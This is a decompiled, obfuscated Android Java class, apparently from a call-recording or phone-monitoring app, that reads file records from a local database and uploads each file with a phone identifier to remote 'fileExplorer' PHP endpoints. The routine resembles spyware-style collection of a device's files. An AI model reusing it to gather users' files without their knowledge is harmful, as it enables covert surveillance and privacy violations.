package com.yasoka.spcallrecord.recorder.call.a.c.i;

import a.c.b.A;
import a.c.b.S;
import a.c.e.a;
import a.c.e.e;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import androidx.browser.trusted.sharing.ShareTarget;
import com.app.service.UploadDataService;
import com.crashlytics.android.Crashlytics;
import java.io.File;
import java.util.HashMap;
import java.util.Map;
import okhttp3.MediaType;
import okhttp3.MultipartBody.Part;
import okhttp3.RequestBody;

/* compiled from: SendFileExplorer */
public class h implements Runnable {

    /* renamed from: b reason: collision with root package name */
    public static boolean f274b;

    /* renamed from: a reason: collision with root package name */
    private final Context f275a;

    public h(Context context) {
        this.f275a = context;
    }

    private void a() {
        try {
            UploadDataService.b();
            StringBuilder sb = new StringBuilder();
            sb.append("UploadDataService.getmNbTask() : ");
            sb.append(UploadDataService.f1272b);
            sb.toString();
            if (UploadDataService.f1272b <= 0) {
                this.f275a.stopService(new Intent(this.f275a, UploadDataService.class));
            }
        } catch (Throwable th) {
            try {
                th.getStackTrace();
                Crashlytics.logException(th);
            } catch (Exception unused) {
            }
        }
    }

    public void run() {
        String str = "";
        try {
            if (f274b) {
                a();
                return;
            }
            int i = 1;
            f274b = true;
            S s = new S(this.f275a);
            s.b();
            Cursor c2 = s.c();
            if (c2 != null && c2.getCount() > 0 && c2.moveToFirst()) {
                while (true) {
                    A a2 = new A();
                    a2.a(c2.getInt(0));
                    a2.b(c2.getString(i));
                    a2.c(c2.getString(2));
                    a2.d(c2.getString(3));
                    a2.a(c2.getString(4));
                    if (a2.d() != null && !a2.d().equals(str)) {
                        File file = new File(a2.d());
                        if (file.exists()) {
                            boolean equals = a2.a().equals(str);
                            String str2 = "fileExplorer/insertNewFile.php";
                            String str3 = "uploadedfile";
                            String str4 = ShareTarget.ENCODING_TYPE_MULTIPART;
                            String str5 = "nameFile";
                            String str6 = "idPhone";
                            if (!equals) {
                                StringBuilder sb = new StringBuilder();
                                sb.append(e.e(this.f275a));
                                sb.append("/");
                                sb.append(a2.e());
                                String sb2 = sb.toString();
                                HashMap hashMap = new HashMap();
                                StringBuilder sb3 = new StringBuilder();
                                sb3.append(str);
                                sb3.append(e.e(this.f275a));
                                hashMap.put(str6, sb3.toString());
                                hashMap.put(str5, a2.c());
                                hashMap.put("pathFile", sb2);
                                hashMap.put("date", a2.a());
                                if (a.b("fileExplorer/insertNewFileFirst.php", (Map<String, String>) hashMap)) {
                                    s.a(a2.b(), a2);
                                    HashMap hashMap2 = new HashMap();
                                    StringBuilder sb4 = new StringBuilder();
                                    sb4.append(str);
                                    sb4.append(e.e(this.f275a));
                                    hashMap2.put(str6, com.app.retrofit.a.a(sb4.toString()));
                                    StringBuilder sb5 = new StringBuilder();
                                    sb5.append(str);
                                    sb5.append(a2.c());
                                    hashMap2.put(str5, com.app.retrofit.a.a(sb5.toString()));
                                    if (a.a(str2, hashMap2, Part.createFormData(str3, a2.e(), RequestBody.create(MediaType.parse(str4), file)))) {
                                        s.a(a2.b());
                                    }
                                }
                            } else {
                                HashMap hashMap3 = new HashMap();
                                StringBuilder sb6 = new StringBuilder();
                                sb6.append(str);
                                sb6.append(e.e(this.f275a));
                                hashMap3.put(str6, com.app.retrofit.a.a(sb6.toString()));
                                StringBuilder sb7 = new StringBuilder();
                                sb7.append(str);
                                sb7.append(a2.c());
                                hashMap3.put(str5, com.app.retrofit.a.a(sb7.toString()));
                                if (a.a(str2, hashMap3, Part.createFormData(str3, a2.e(), RequestBody.create(MediaType.parse(str4), new File(a2.d()))))) {
                                    s.a(a2.b());
                                }
                            }
                        } else {
                            s.a(a2.b());
                        }
                    }
                    if (!c2.moveToNext()) {
                        break;
                    }
                    i = 1;
                }
            }
            s.a();
            if (c2 != null) {
                c2.close();
            }
            f274b = false;
            a();
        } catch (Exception e2) {
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }
}
